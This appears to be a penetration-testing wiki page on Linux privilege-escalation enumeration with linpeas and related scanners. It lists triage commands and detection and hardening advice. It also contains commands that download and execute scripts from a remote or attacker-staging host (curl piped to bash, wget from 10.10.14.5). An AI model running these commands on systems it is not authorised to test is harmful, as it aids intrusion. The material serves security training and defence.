---
title: Linpeas and the Linux Privilege Escalation Enumeration Flow
slug: linpeas-and-enumeration-flow
---

> **TL;DR:** Drop linpeas first for breadth, then triage the 99-red findings manually — automation finds candidates, your brain confirms exploitability.

## What it is
Linux post-exploitation enumeration is the bridge between landing a low-privileged shell and reaching root. The standard flow is to run a broad scanner (linpeas.sh, lse.sh, linuxprivchecker, linenum) and then manually verify the highest-confidence findings with focused commands. Beginners often paste the entire scanner output into a writeup; experienced operators read the colour-coded summary, pick two or three leads, and ignore the rest.

## Preconditions / where it applies
- Foothold type: interactive shell as a non-root user (TTY upgrade strongly recommended first)
- Target OS: Linux — distro affects which checks matter (Ubuntu kernel exploits vs RHEL SELinux nuances)
- Egress restrictions: ideally outbound to fetch the scanner; otherwise stage via your existing channel

## Technique
Get linpeas onto the host without writing to disk if possible:
```bash
# in-memory execution
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
# or staged
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/.l && bash /tmp/.l -a | tee /tmp/.lp
```

Read the output in this priority order:
1. **99% PE vector** banners (red/yellow) — known CVE matches, writable PATH, sudo NOPASSWD
2. Sudo rights and capabilities
3. SUID/SGID binaries not in the default set
4. Cron jobs writable by your user
5. Network sockets only listening on localhost (pivots inward)

Manual triage commands to run alongside:
```bash
sudo -l                              # what can I run as root?
id; groups                           # docker/lxd/disk groups = instant root
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
getcap -r / 2>/dev/null              # file capabilities
uname -a; cat /etc/os-release        # kernel + distro for CVE lookup
crontab -l; ls -la /etc/cron*        # scheduled tasks
mount | grep -i nfs                  # no_root_squash exports?
ss -tlnp                             # internal-only services
```

Complementary scanners (don't run all four — pick two):
```bash
./lse.sh -l1                # interactive, lighter than linpeas
python3 linuxprivchecker.py # older but quick
./LinEnum.sh -t -r report   # classic, fewer false positives
```

Avoiding noise: linpeas flags *every* world-writable file as yellow — most are tmp logs. Cross-reference any SUID hit against [GTFOBins] before celebrating, and ignore kernel CVEs older than the box's likely patch window unless you have nothing else.

## Detection and defence
- Process signals: rapid `find` traversals across the whole FS, sequential reads of `/etc/passwd`, `/etc/shadow`, `/etc/sudoers.d/*`, executions of `sudo -l` by service accounts
- File signals: scripts dropped in `/tmp` or `/dev/shm` matching linpeas/lse hashes
- Hardening: auditd rules on sensitive reads, restrict SUID set, enforce `noexec` on `/tmp` and `/dev/shm`, alert on `find` with `-perm -4000` from non-admin users

## References
- [PEASS-ng linpeas](https://github.com/peass-ng/PEASS-ng) — actively maintained successor to the original
- [GTFOBins](https://gtfobins.github.io/) — exploit primitives for SUID/sudo binaries

See also: [[linux-privesc-vectors]], [[linux-enumeration]], [[sudo-misconfig]], [[suid-sgid-binaries]].
